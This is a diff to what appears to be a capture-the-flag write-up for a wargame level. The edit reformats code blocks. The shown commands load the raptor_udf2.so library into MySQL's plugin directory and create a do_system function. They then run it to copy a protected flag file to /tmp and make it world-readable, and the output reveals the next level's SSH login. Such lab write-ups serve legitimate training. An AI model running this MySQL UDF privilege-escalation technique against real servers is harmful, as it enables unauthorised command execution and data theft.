@@ -395,11 +395,14 @@ We use our `plugin-dir` enumerated with `ps` command. Then we create our `do_sys
 mysql> select * from foo into dumpfile '/usr/local/mysql/lib/plugin/raptor_udf2.so';
 mysql> create function do_system returns integer soname 'raptor_udf2.so';
 ```
-All we have to do now is to execute a command to read our flag
-```bash
+All we have to do now is to execute a command
+```mysql
 mysql> select do_system('cp /wargames/level9/validation/flag /tmp/lev9 ; chmod 777 /tmp/lev9');
 mysql> exit;
 Bye
+```
+We can now read the flag
+```bash
 level9@harmonie-technologie:~$ cat /tmp/lev9 
 Identifiants SSH :
 login : levelfinal
